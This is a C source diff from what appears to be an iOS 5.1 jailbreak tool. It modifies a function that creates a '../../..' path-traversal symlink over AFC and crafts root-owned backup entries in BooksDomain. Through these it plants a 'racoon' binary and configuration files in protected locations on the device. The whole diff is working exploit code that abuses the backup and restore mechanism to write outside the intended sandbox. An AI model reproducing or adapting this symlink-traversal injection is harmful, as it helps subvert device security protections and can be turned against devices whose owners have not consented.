@@ -1583,7 +1583,7 @@ static int jailbreak_51(const char* uuid, status_cb_t status_cb, device_t* devic
 	afc_remove_path(afc, "/Books/" IOS_5_1_LOCKDOWN_INJECT_DIR);
 	afc_remove_path(afc, "/Books/" IOS_5_1_OVERRIDES_INJECT_DIR);
 
-	if (afc_make_link(afc, AFC_SYMLINK, "../../../audit", "/Books/" IOS_5_1_AUDIT_INJECT_DIR) != AFC_E_SUCCESS) {
+	if (afc_make_link(afc, AFC_SYMLINK, "../../..", "/Books/" IOS_5_1_AUDIT_INJECT_DIR) != AFC_E_SUCCESS) {
 		status_cb("ERROR: could not create link!", 0);
 		afc_client_free(afc);
 		device_free(device);
@@ -1839,15 +1839,34 @@ static int jailbreak_51(const char* uuid, status_cb_t status_cb, device_t* devic
 
 	backup_add_file(backup, "data/common/rocky-racoon/overrides.plist", 0644, "BooksDomain", IOS_5_1_OVERRIDES_INJECT_DIR "/overrides.plist");
 
+	// create audit directory
+	bf = backup_file_create(NULL);
+	backup_file_set_domain(bf, "BooksDomain");
+	backup_file_set_path(bf, IOS_5_1_AUDIT_INJECT_DIR "/audit");
+	backup_file_set_mode(bf, 040755);
+	backup_file_set_inode(bf, 54320);
+	backup_file_set_uid(bf, 0);
+	backup_file_set_gid(bf, 0);
+	unsigned int tm = (unsigned int)(time(NULL));
+	backup_file_set_time1(bf, tm);
+	backup_file_set_time2(bf, tm);
+	backup_file_set_time3(bf, tm);
+	backup_file_set_length(bf, 0);
+	backup_file_set_flag(bf, 0);
+	if (backup_update_file(backup, bf) < 0) {
+		fprintf(stderr, "ERROR: could not add file to backup\n");
+	}
+	backup_file_free(bf);
+
 	// create rocky-racoon directory
 	bf = backup_file_create(NULL);
 	backup_file_set_domain(bf, "BooksDomain");
-	backup_file_set_path(bf, IOS_5_1_AUDIT_INJECT_DIR "/rocky-racoon");
+	backup_file_set_path(bf, IOS_5_1_AUDIT_INJECT_DIR "/audit/rocky-racoon");
 	backup_file_set_mode(bf, 040755);
 	backup_file_set_inode(bf, 54321);
 	backup_file_set_uid(bf, 501);
 	backup_file_set_gid(bf, 501);
-	unsigned int tm = (unsigned int)(time(NULL));
+	tm = (unsigned int)(time(NULL));
 	backup_file_set_time1(bf, tm);
 	backup_file_set_time2(bf, tm);
 	backup_file_set_time3(bf, tm);
@@ -1865,22 +1884,22 @@ static int jailbreak_51(const char* uuid, status_cb_t status_cb, device_t* devic
 	// add 00-ff files
 	for (i = 0; i < 256; i++) {
 		sprintf(rocky_file, "data/%s/%s/rocky-racoon/%02x", build, product, i);
-		sprintf(rocky_target, IOS_5_1_AUDIT_INJECT_DIR "/rocky-racoon/%02x", i); 
+		sprintf(rocky_target, IOS_5_1_AUDIT_INJECT_DIR "/audit/rocky-racoon/%02x", i); 
 		backup_add_file(backup, rocky_file, 0644, "BooksDomain", rocky_target);
 	}
 
 	// add boot.conf
 	sprintf(rocky_file, "data/%s/%s/rocky-racoon/%s", build, product, "boot.conf");
-	sprintf(rocky_target, IOS_5_1_AUDIT_INJECT_DIR "/rocky-racoon/%s", "boot.conf");
+	sprintf(rocky_target, IOS_5_1_AUDIT_INJECT_DIR "/audit/rocky-racoon/%s", "boot.conf");
 	backup_add_file(backup, rocky_file, 0644, "BooksDomain", rocky_target);
 
 	// add install.conf
 	sprintf(rocky_file, "data/%s/%s/rocky-racoon/%s", build, product, "install.conf");
-	sprintf(rocky_target, IOS_5_1_AUDIT_INJECT_DIR "/rocky-racoon/%s", "install.conf");
+	sprintf(rocky_target, IOS_5_1_AUDIT_INJECT_DIR "/audit/rocky-racoon/%s", "install.conf");
 	backup_add_file(backup, rocky_file, 0644, "BooksDomain", rocky_target);
 
 	// add racoon
-	sprintf(rocky_target, IOS_5_1_AUDIT_INJECT_DIR "/rocky-racoon/%s", "racoon");
+	sprintf(rocky_target, IOS_5_1_AUDIT_INJECT_DIR "/audit/rocky-racoon/%s", "racoon");
 	backup_add_file(backup, racoon_path, 0755, "BooksDomain", rocky_target);
 
 	backup_write_mbdb(backup);
